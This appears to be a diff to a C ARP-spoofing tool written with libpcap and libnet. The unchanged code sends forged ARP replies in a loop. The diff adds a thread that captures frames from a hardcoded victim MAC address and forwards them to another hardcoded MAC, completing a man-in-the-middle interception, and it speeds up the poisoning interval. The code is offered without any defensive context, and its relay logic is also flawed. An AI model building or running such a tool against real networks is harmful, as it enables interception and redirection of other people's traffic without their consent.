@@ -3,6 +3,9 @@
 #include <arpa/inet.h>
 #include <pcap.h>
 #include <libnet.h>
+#include <pthread.h>
+
+pcap_t *handle;
 
 struct custom_arp_hdr
 {
@@ -38,6 +41,38 @@ struct custom_arp_hdr
     uint8_t ar_tip[4];
 };
 
+void *packet_handler(void *arg)
+{
+    int sock = *(int*)arg;
+    const u_char *p;
+    struct pcap_pkthdr *h;
+    int res = pcap_next_ex(handle, &h, &p);
+    struct libnet_ethernet_hdr* eth_check = (struct libnet_ethernet_hdr*)p;
+printf("c\n");
+    if(res == -1) pthread_exit(NULL);
+    if(res == 1){
+        if((eth_check->ether_shost[0] == 0x00) &&
+                ((eth_check->ether_shost[1]) == 0x0c) &&
+                ((eth_check->ether_shost[2]) == 0x29) &&
+                ((eth_check->ether_shost[3]) == 0x81) &&
+                ((eth_check->ether_shost[4]) == 0x57) &&
+                ((eth_check->ether_shost[5]) == 0x56)){
+            eth_check->ether_dhost[0] = 0x00;
+            eth_check->ether_dhost[1] = 0x50;
+            eth_check->ether_dhost[2] = 0x56;
+            eth_check->ether_dhost[3] = 0xe9;
+            eth_check->ether_dhost[4] = 0xa9;
+            eth_check->ether_dhost[5] = 0x38;
+
+            if(pcap_sendpacket(handle, (u_char*)p, h->len) != 0)
+                printf("packet error\n");
+
+            else
+                printf("relay packet\n");
+        }
+    }
+}
+
 int main()
 {
     char *dev, errbuf[PCAP_ERRBUF_SIZE];
@@ -52,7 +87,6 @@ int main()
 
     printf("Device: %s\n", dev);
 
-    pcap_t *handle;
     handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
 
     if (handle == NULL){
@@ -113,6 +147,13 @@ int main()
 
     for(int i = 42; i <= 59; i++) send_buf[i] = 0x00;
 
+    pthread_t packet_threads;
+    int sock=1;
+    if(pthread_create(&packet_threads, NULL, &packet_handler, (void*)&sock) < 0)
+            printf("thread error");
+
+    pthread_detach(packet_threads);
+
     while(1){
         if(pcap_sendpacket(handle, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18)) != 0)
             printf("arp error\n");
@@ -123,6 +164,6 @@ int main()
             printf("arp send\n");
         }
 
-        sleep(3);
+        sleep(1);
      }
 }
